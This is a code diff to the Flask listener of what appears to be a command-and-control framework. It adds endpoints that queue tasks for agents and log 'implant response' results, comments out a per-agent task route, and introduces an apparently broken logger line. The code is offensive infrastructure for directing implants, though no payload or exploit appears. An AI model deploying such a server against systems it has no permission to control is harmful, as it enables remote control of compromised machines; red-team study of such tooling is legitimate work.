@@ -1,5 +1,6 @@
 import sys
 import threading
+import uuid
 from multiprocessing.context import Process
 from random import choice
 from string import ascii_uppercase
@@ -45,6 +46,41 @@ class Listener:
             with open(self.keyPath, "rt") as f:
                 self.key = f.read()
 
+        # 写tasks
+        @self.app.route("/tasks", methods=['POST'])
+        def addTasks():
+            # creates a random string of 6 uppercase letters as the new agent’s name
+            body = flask.request.get_json()
+            # print(body)
+            # dump 将obj转化为JSON字符串
+            # loads将 包含JSON的转化为py obj
+            json_obj = json.dumps(body)
+            if os.path.exists(self.agentsPath):
+                with open(self.agentsPath+"tasks.txt", "a+") as f:
+                    f.write(json_obj+"\r\n")
+            success("task saved")
+            return (json_obj, 200)
+
+        # 读tasks
+        @self.app.route("/tasks", methods=['GET'])
+        def getTasks():
+            if os.path.exists(self.agentsPath):
+                with open(self.agentsPath+"tasks.txt", "r") as f:
+                    data = f.readline()
+                return data, 200
+            else:
+                return ('failed', 400)
+
+        # 读tasks
+        @self.app.route("/res", methods=['POST'])
+        def getResults():
+            if str(flask.request.get_json()) != '{}':
+                body = flask.request.get_json()
+                print("Received implant response: {}".format(body))
+                return 'ok', 200
+            else:
+                return 'failed', 400
+
         # /reg is responsible for handling new agents, it only accepts POST
         # TODO 需要鉴权啥的
         @self.app.route("/reg", methods=['POST'])
@@ -60,23 +96,23 @@ class Listener:
 
         # the endpoint that agents request to download their tasks
         # <name> is the agent’s name
-        @self.app.route("/tasks/<name>", methods=['GET'])
-        def serveTasks(name):
-            if os.path.exists("{}/{}/tasks".format(self.agentsPath, name)):
-                with open("{}{}/tasks".format(self.agentsPath, name), "r") as f:
-                    task = f.read()
-
-                clearAgentTasks(name)
-                return (task,200)
-            else:
-                return ('',204)
+        # @self.app.route("/tasks/<name>", methods=['GET'])
+        # def serveTasks(name):
+        #     if os.path.exists("{}/{}/tasks".format(self.agentsPath, name)):
+        #         with open("{}{}/tasks".format(self.agentsPath, name), "r") as f:
+        #             task = f.read()
+        #
+        #         clearAgentTasks(name)
+        #         return (task,200)
+        #     else:
+        #         return ('',204)
 
         # the endpoint that agents request to send results
         @self.app.route("/results/<name>", methods=['POST'])
         def receiveResults(name):
             result = flask.request.form.get("result")
             displayResults(name, result)
-            return ('',204)
+            return ('', 204)
 
         #  responsible for downloading files,
         #  <name> is a placeholder for the file name
@@ -104,7 +140,7 @@ class Listener:
     # flask applications don’t provide a reliable way to stop the application
     # only way was to kill the process
     def run(self):
-        self.app.logger.disabled = True
+        self.app.logger = True
         self.app.run(port=self.port, host=self.ip)
 
     def start(self):
